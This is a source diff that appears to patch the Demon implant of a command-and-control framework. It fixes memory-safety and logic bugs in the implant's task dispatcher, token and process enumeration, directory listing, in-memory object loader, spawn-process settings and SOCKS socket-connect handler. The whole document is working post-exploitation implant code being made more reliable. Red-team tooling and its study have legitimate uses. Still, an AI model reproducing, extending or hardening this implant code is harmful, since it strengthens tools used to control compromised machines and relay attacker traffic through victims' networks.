@@ -113,6 +113,8 @@ VOID CommandDispatcher( VOID )
                 if ( CommandID != DEMON_COMMAND_NO_JOB ) {
                     PRINTF( "Task => RequestID:[%d : %x] CommandID:[%d : %x] TaskBuffer:[%x : %d]\n", RequestID, RequestID, CommandID, CommandID, TaskBuffer, TaskBufferSize )
                     if ( TaskBufferSize != 0 ) {
+                        /* free the previous task parser buffer before re-creating it */
+                        ParserDestroy( &TaskParser );
                         ParserNew( &TaskParser, TaskBuffer, TaskBufferSize );
                         ParserDecrypt( &TaskParser, Instance->Config.AES.Key, Instance->Config.AES.IV );
                     }
@@ -386,8 +388,9 @@ VOID CommandProc( PPARSER Parser )
                         HANDLE hToken   = NULL;
 
                         hProcess = ProcessOpen( U_PTR( SysProcessInfo->UniqueProcessId ) , ( Instance->Session.OSVersion > WIN_VERSION_XP ) ? PROCESS_QUERY_LIMITED_INFORMATION : PROCESS_QUERY_INFORMATION );
-                        if ( ! hProcess )
-                            continue;
+                        if ( ! hProcess ) {
+                            /* failed to open: skip this entry but still advance to the next one */
+                        } else {
 
                         if ( NT_SUCCESS( SysNtOpenProcessToken( hProcess, TOKEN_QUERY, &hToken ) ) ) {
                             if ( TokenQueryOwner( hToken, &UserDomain, TOKEN_OWNER_FLAG_DEFAULT ) ) {
@@ -415,6 +418,8 @@ VOID CommandProc( PPARSER Parser )
                             MemZero( UserDomain.Buffer, UserDomain.Length );
                             MmHeapFree( UserDomain.Buffer );
                             UserDomain.Buffer = NULL;
+                        }
+
                         }
                     }
 
@@ -753,14 +758,16 @@ VOID CommandFS( PPARSER Parser )
                 break;
             }
 
-            Path = Instance->Win32.LocalAlloc( LPTR, MAX_PATH * sizeof( WCHAR ) );
+            /* like listDir: room for the appended backslash-star and NUL
+             * on top of a MAX_PATH-1 character directory */
+            Path = Instance->Win32.LocalAlloc( LPTR, ( MAX_PATH + 2 + 1 ) * sizeof( WCHAR ) );
 
             if ( TargetFolder[ 0 ] == L'.' )
             {
                 if ( ! Instance->Win32.GetCurrentDirectoryW( MAX_PATH, Path ) )
                 {
                     PRINTF( "Failed to get current dir: %d\n", NtGetLastError() );
-                    DATA_FREE( Path, MAX_PATH * sizeof( WCHAR ) );
+                    DATA_FREE( Path, ( MAX_PATH + 2 + 1 ) * sizeof( WCHAR ) );
                     break;
                 }
 
@@ -832,7 +839,7 @@ VOID CommandFS( PPARSER Parser )
                 RootDir = TmpRootDir;
             }
 
-            DATA_FREE( Path, MAX_PATH * sizeof( WCHAR ) );
+            DATA_FREE( Path, ( MAX_PATH + 2 + 1 ) * sizeof( WCHAR ) );
 
             break;
         }
@@ -1243,7 +1250,7 @@ VOID CommandInlineExecute( PPARSER Parser )
         case 0:
         {
             PUTS( "Use Non-Threaded CoffeeLdr" )
-            CoffeeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize, RequestID );
+            CoffeeLdr( FunctionName, ObjectData, ObjectDataSize, ArgBuffer, ArgSize, RequestID );
             break;
         }
 
@@ -1266,7 +1273,7 @@ VOID CommandInlineExecute( PPARSER Parser )
             else
             {
                 PUTS( "Config is set to non-threaded" )
-                CoffeeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize, RequestID );
+                CoffeeLdr( FunctionName, ObjectData, ObjectDataSize, ArgBuffer, ArgSize, RequestID );
             }
 
             break;
@@ -2109,7 +2116,11 @@ VOID CommandConfig( PPARSER Parser )
             }
 
             Buffer = ParserGetBytes( Parser, &Size );
-            Instance->Config.Process.Spawn64 = Instance->Win32.LocalAlloc( LPTR, Size );
+            /* + sizeof(WCHAR): the tasking bytes are not guaranteed to be
+             * NUL-terminated, and ProcessCreate reads the buffer as a string */
+            Instance->Config.Process.Spawn64 = Instance->Win32.LocalAlloc( LPTR, Size + sizeof( WCHAR ) );
+            if ( ! Instance->Config.Process.Spawn64 )
+                break;
             MemCopy( Instance->Config.Process.Spawn64, Buffer, Size );
 
             PRINTF( "Instance->Config.Process.Spawn64 => %ls\n", Instance->Config.Process.Spawn64 );
@@ -2131,7 +2142,10 @@ VOID CommandConfig( PPARSER Parser )
             }
 
             Buffer = ParserGetBytes( Parser, &Size );
-            Instance->Config.Process.Spawn86 = Instance->Win32.LocalAlloc( LPTR, Size );
+            /* + sizeof(WCHAR): see SPAWN64 above */
+            Instance->Config.Process.Spawn86 = Instance->Win32.LocalAlloc( LPTR, Size + sizeof( WCHAR ) );
+            if ( ! Instance->Config.Process.Spawn86 )
+                break;
             MemCopy( Instance->Config.Process.Spawn86, Buffer, Size );
 
             PRINTF( "Instance->Config.Process.Spawn86 => %ls\n", Instance->Config.Process.Spawn86 );
@@ -3024,6 +3038,11 @@ VOID CommandSocket( PPARSER Parser )
                 PackageAddInt32( Package, FALSE );
                 PackageAddInt32( Package, Instance->Win32.WSAGetLastError() );
             }
+
+            /* do not fall through into SOCKET_COMMAND_CONNECT: the leftover
+             * task bytes would be re-parsed as a connect request and open an
+             * outbound connection from garbage values */
+            break;
         }
 
         case SOCKET_COMMAND_CONNECT: PUTS( "Socket::Connect" )
@@ -3045,6 +3064,20 @@ VOID CommandSocket( PPARSER Parser )
             HostIp = ParserGetBytes( Parser, &HostIpSize );
             Port   = ParserGetInt16( Parser );
 
+            /* the address buffer is tasking-controlled: never trust it to
+             * exist or to be big enough for the requested address type */
+            if ( ( ! HostIp ) ||
+                 ( ATYP == 1 && HostIpSize < sizeof( UINT32 ) ) ||
+                 ( ATYP == 4 && HostIpSize < 16 ) )
+            {
+                PRINTF( "Socket::Connect malformed task: ATYP %d with buffer size %d\n", ATYP, HostIpSize )
+
+                PackageAddInt32( Package, FALSE );
+                PackageAddInt32( Package, ScId );
+                PackageAddInt32( Package, WSAEINVAL );
+                break;
+            }
+
             if ( ATYP == 1 )
             {
                 // IPv4
@@ -3060,6 +3093,13 @@ VOID CommandSocket( PPARSER Parser )
 
                 // make sure there is a nullbyte at the end of the domain
                 Domain = Instance->Win32.LocalAlloc( LPTR, HostIpSize + 1 );
+                if ( ! Domain )
+                {
+                    PackageAddInt32( Package, FALSE );
+                    PackageAddInt32( Package, ScId );
+                    PackageAddInt32( Package, WSA_NOT_ENOUGH_MEMORY );
+                    break;
+                }
                 MemCopy( Domain, HostIp, HostIpSize );
 
                 IPv4 = DnsQueryIPv4( (LPSTR)Domain );
@@ -3071,7 +3111,13 @@ VOID CommandSocket( PPARSER Parser )
                     UseIpv4 = FALSE;
                 }
 
+                // log before Domain is freed below
+                if ( ! IPv4 && ! IPv6 ) {
+                    PRINTF( "Could not resolve domain: %s\n", Domain );
+                }
+
                 Instance->Win32.LocalFree( Domain );
+                Domain = NULL;
             }
             else if ( ATYP == 4 )
             {
@@ -3102,7 +3148,8 @@ VOID CommandSocket( PPARSER Parser )
             }
             else
             {
-                PRINTF( "Could not resolve domain: %s\n", Domain );
+                // "Could not resolve domain" is logged where the query
+                // happens (ATYP == 3), before Domain is freed
                 // error code for "Host unreachable"
                 ErrorCode = WSAEHOSTUNREACH;
                 PackageAddInt32( Package, FALSE );
